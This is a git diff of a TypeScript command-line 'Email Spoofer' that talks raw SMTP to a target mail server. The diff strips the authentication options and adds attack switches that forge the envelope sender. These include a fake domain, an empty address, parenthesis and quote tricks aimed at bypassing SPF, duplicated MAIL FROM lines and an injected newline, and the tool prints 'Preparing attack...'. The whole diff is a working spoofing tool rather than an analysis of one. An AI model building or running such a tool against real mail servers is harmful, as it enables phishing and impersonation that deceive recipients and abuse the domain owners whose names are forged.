@@ -3,6 +3,7 @@ import { OptionValues, program } from 'commander';
 import dns, { MxRecord } from 'dns';
 import figlet from 'figlet';
 import gradient from 'gradient-string';
+import nanospinner from 'nanospinner';
 import net from 'net';
 
 import { generateMessageID } from './message-id.js';
@@ -24,21 +25,15 @@ program
   .version(process.env.npm_package_version as string);
 
 program
-  .option(rainbow.red + '-h --help', rainbow.space + 'Print help message.');
-program
   .requiredOption(rainbow.green + '-f --from <string>', rainbow.space + 'Email address to send from.');
 program
   .option(rainbow.yellow + '-t --to <string>', rainbow.space + 'Email address to send to.');
 
 program
   .option(`-s --smtp [string]`, `SMTP server to use. (Default: from email domain)`);
-// program
-// .option(rainbow.blue+'--cc \x5bstring]', rainbow.space+'cc email address.');
-program
-  .option('--bcc [string]', 'bcc email address.');
 
 program
-  .option(rainbow.yellow + '-t --to <string>', rainbow.space + 'Email address to send to.');
+  .option('-t --to <string>', 'Email address to send to.');
 program
   .option('--cc [string]', 'cc email address.');
 program
@@ -51,20 +46,30 @@ program
   .option('-p --port [number]', 'Port to host SMTP server on.', '25');
 
 program
-  .option('--username', 'Username for SMTP server.');
+  .option('--MF [string]', 'Mail from a fake domain.');
 program
-  .option('--password', 'Password for SMTP server.');
-// .option('--attachment [string]', 'Attachment to send with the email.');
+  .option('--MFE', '(address Mail from a empty address.');
 program
-  .option('--attachment [string]', 'Attachment to send with the email.');
-console.log(rainbow.blue);
+  .option('--SPF1 [string]', 'address(.attack.address');
+program
+  .option('--SPF2 [string]', 'address\'@attack.address');
+
+program
+  .option('--MFH [string]', 'Insert two from headers.');
+program
+  .option('--MFH2 [string]', 'Insert two from headers, one with a new line.');
+
 program.parse();
 
+let spinner = nanospinner.createSpinner(`Preparing attack...`);
 
 export const option: OptionValues = program.opts();
 if (option.help) {
   program.help();
 }
+
+console.log(gradient.rainbow(figlet.textSync('Email Spoofer', { horizontalLayout: 'full' })));
+
 if (!(option.from && option.to)) {
   console.log('Please provide a from and to email address.');
   process.exit(1);
@@ -77,10 +82,10 @@ if (!option.smtp) {
 dns.resolveMx(option.smtp, (err, address: MxRecord[]) => {
   if (err) {
     console.log('Please check your internet connection.');
+    spinner.error();
     process.exit(1);
   }
   const server: string = address[0].exchange;
-  console.log(server);
   const socket = net.createConnection(
     option.port,
     server, () => {
@@ -88,17 +93,28 @@ dns.resolveMx(option.smtp, (err, address: MxRecord[]) => {
     });
   const CRLF: string = '\r\n';
   const payload: string[] = [`HELO ${server}`];
-  if (option.username && option.password) {
-    payload.push(`STARTTLS`);
-    payload.push(`AUTH`);
-    payload.push(`${option.username.toString('base64')}`);
-    payload.push(`${option.password.toString('base64')}`);
+  if (option.MF) {
+    payload.push(`MAIL FROM: ${option.MF}`);
+  } else if (option.MFE) {
+    payload.push(`MAIL FROM:<(${option.from}>`);
+  } else if (option.SPF1) {
+    payload.push(`MAIL FROM:<${option.from}(.${option.SPF1}>`);
+  } else if (option.SPF2) {
+    payload.push(`MAIL FROM:<${option.from}'@${option.SPF2}>`);
+  } else if (option.MFH) {
+    payload.push(`MAIL FROM:<${option.MFH}>`);
+    payload.push(`MAIL FROM:<${option.from}>`);
+  } else if (option.MFH2) {
+    payload.push(`MAIL FROM:\n<${option.MFH2}>`);
+    payload.push(`MAIL FROM:<${option.from}>`);
+  } else {
+    payload.push(`MAIL FROM:<${option.from}>`);
   }
-  payload.push(`MAIL FROM: <${option.from}>`);
-  payload.push(`RCPT TO: <${option.to}>`);
-  payload.push(`DATA
-From: ${option.from}
-To: ${option.to}`);
+  payload.push(`RCPT TO:<${option.to}>`);
+  payload.push(`DATA`);
+  payload.push(`
+To: ${option.to}
+From: ${option.from}`);
   if (option.cc) {
     payload[payload.length - 1] += (`Cc: ${option.cc}`);
   }
@@ -115,13 +131,15 @@ ${CRLF}.`);
   payload.push(`QUIT`);
   let index: number = 0;
   socket.on('data', (data: Buffer) => {
+    spinner.success();
     const response: string = data.toString();
     console.log(response);
-    if (index <= payload.length) {
+    if (index < payload.length || payload[index]) {
       socket.write(`${payload[index]}${CRLF} `);
-      console.log(`> ${payload[index]} `);
+      spinner = nanospinner.createSpinner(`${payload[index]}`).start();
       index++;
     } else {
+      spinner.success();
       socket.end();
     }
   });
